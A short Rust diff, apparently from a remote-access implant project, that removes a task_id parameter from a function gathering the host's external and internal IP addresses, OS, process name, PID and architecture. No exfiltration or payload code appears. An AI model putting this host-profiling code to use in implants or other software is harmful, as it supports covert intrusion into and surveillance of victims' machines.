@@ -8,7 +8,7 @@ use users::get_current_username;
 use crate::errors::ImplantError;
 use crate::models::system_info::SystemInfo;
 
-pub fn gather_system_info(task_id: String, implant_id: &str) -> Result<SystemInfo, ImplantError> {
+pub fn gather_system_info(implant_id: &str) -> Result<SystemInfo, ImplantError> {
     let external_ip_address = get_external_ip_address()?;
     let internal_ip_address = get_internal_ip_address()?;
     let os_type = (env::consts::OS).to_owned();
@@ -27,7 +27,6 @@ pub fn gather_system_info(task_id: String, implant_id: &str) -> Result<SystemInf
         process_name,
         pid,
         architecture,
-        task_id,
         implant_id.to_owned(),
     );
 
